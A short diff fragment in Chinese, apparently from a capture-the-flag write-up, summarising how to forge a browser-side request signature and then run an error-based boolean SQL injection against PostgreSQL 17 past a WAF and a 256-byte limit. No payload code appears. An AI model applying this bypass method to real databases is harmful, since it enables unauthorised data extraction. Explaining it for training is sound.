-- 复用要点：先复现前端签名或在浏览器环境中调用，再对后端查询参数做注入。
+
+本题要先拆掉“客户端签名就是鉴权”的错觉。签名算法和恢复 seed 所需的全部逻辑都交付给浏览器；无论按 Go 源码移植，还是直接复用原始 WASM，都可以为任意 `q` 生成有效签名。真正受服务端绑定的是一次性 nonce、时间戳、salt 与前后一致的 User-Agent，Client Hints 和正常 probe 混合并不是额外秘密。
+
+SQL 阶段的关键是适应 WAF 和 256 字节上限。官方利用 PG17 JSON 强制类型转换形成错误型布尔 oracle，避免被屏蔽的联合查询、注释和显式 cast；搜索结果 oracle 则是数据依赖的替代方案。两条路线都应做到每次条件请求先取新 nonce，再签名，再根据稳定的单一信号二分。
